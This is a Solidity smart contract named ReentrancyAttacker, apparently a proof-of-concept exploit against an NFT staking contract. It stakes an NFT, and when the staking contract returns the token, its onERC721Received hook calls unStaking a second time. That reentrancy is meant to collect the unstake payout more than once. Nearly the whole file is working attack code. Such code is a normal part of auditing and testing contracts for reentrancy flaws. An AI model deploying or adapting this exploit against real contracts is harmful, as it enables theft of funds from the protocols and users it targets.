// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";

interface IStake {
    function staking(
        uint256 tokenId,
        uint8 stakePeriod,
        uint256 tokenRateUSDT,
        uint256 exp,
        bytes calldata sig
    ) external returns (uint256 tokenValue);

    function unStaking(
        uint256 stakeId,
        uint256 tokenRateUSDT,
        uint256 exp,
        bytes calldata sig
    ) external;
}

contract ReentrancyAttacker is IERC721Receiver {
    address public stake;
    address public nft;

    uint256 public re_stakeId;
    uint256 public re_tokenRateUSDT;
    uint256 public re_exp;
    bytes public re_sig;

    function setup(address _stake, address _nft) external {
        stake = _stake;
        nft = _nft;
    }

    function approveForStake() external {
        IERC721(nft).setApprovalForAll(stake, true);
    }

    function stakeOnce(
        uint256 tokenId,
        uint8 stakePeriod,
        uint256 tokenRateUSDT,
        uint256 exp,
        bytes calldata sig
    ) external {
        IStake(stake).staking(tokenId, stakePeriod, tokenRateUSDT, exp, sig);
    }

    function setReenterParams(
        uint256 stakeId,
        uint256 tokenRateUSDT,
        uint256 exp,
        bytes calldata sig
    ) external {
        re_stakeId = stakeId;
        re_tokenRateUSDT = tokenRateUSDT;
        re_exp = exp;
        re_sig = sig;
    }

    function triggerUnstake(
        uint256 stakeId,
        uint256 tokenRateUSDT,
        uint256 exp,
        bytes calldata sig
    ) external {
        IStake(stake).unStaking(stakeId, tokenRateUSDT, exp, sig);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external override returns (bytes4) {
        if (re_exp != 0) {
            IStake(stake).unStaking(re_stakeId, re_tokenRateUSDT, re_exp, re_sig);
        }
        return this.onERC721Received.selector;
    }
}
